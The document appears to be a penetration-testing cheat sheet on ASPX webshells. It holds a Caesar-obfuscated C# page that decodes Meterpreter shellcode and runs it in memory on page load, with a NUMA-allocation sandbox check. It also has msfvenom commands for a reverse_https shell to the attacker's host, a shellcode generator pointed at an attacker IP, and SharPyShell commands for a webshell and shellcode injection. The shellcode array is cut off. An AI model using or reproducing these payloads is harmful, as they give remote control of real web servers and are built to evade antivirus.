#### ObfuscatedWebshell.aspx

    //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f aspx -o /tmp/met.aspx
    //then use CaesarHelper.exe to encode the shellcode portion and replace here (w/ length):

    <%@ Page Language="C#" AutoEventWireup="true" %>
    <%@ Import Namespace="System.IO" %>
    <script runat="server">
        private static Int32 MEM_COMMIT=0x1000;
        private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

        [System.Runtime.InteropServices.DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

        [System.Runtime.InteropServices.DllImport("kernel32")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        protected void Page_Load(object sender, EventArgs e)
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if(mem == null)
            {
                return;
            }
            //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f aspx -o /tmp/met.aspx
            //then use CaesarHelper to encode shellcode
            byte[] dF1YBfjQ = new byte[684] {0xfe, 0x4a, 0x85, 0xe6, 0xf2, 0xea, 0xce, 0x02, 0x02, 0x02, 0x43, 0x53, 0x43, 0x52, 0x54, 0x4a, 0x33, 0xd4, 0x53, 0x67, 0x4a, 0x8d, 0x54, 0x62, 0x58, 0x4a, 0x8d, 0x54, 0x1a, 0x4a, 0x8d, 0x54, 0x22, 0x4f, 0x33, 0xcb, 0x4a, 0x11, 0xb9, 0x4c, 0x4c, ...................................................................


            for(int i = 0; i < dF1YBfjQ.Length; i++)
            {
                dF1YBfjQ[i] = (byte)(((uint)dF1YBfjQ[i] - 2) & 0xFF);
            }

            IntPtr gF2p__4 = VirtualAlloc(IntPtr.Zero,(UIntPtr)dF1YBfjQ.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            System.Runtime.InteropServices.Marshal.Copy(dF1YBfjQ,0,gF2p__4,dF1YBfjQ.Length);
            IntPtr jn8rwz6JN = IntPtr.Zero;
            IntPtr jqnMhJu = CreateThread(IntPtr.Zero,UIntPtr.Zero,gF2p__4,IntPtr.Zero,0,ref jn8rwz6JN);
        }
    </script>

#### Another Method - aspx_shellcode_generator.py
    
- `python3 aspx_shellcode_generator.py --LHOST 192.168.49.121 --LPORT 443`

#### Another Method - SharPyShell

    python3 SharPyShell.py generate -p "abc123"
    python3 SharPyShell.py interact -u 'http://192.168.189.132/upload/sharpyshell.aspx' -p 'abc123'
    #exec_cmd whoami /all
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw -o /tmp/sc_raw
    #inject_shellcode /tmp/sc_raw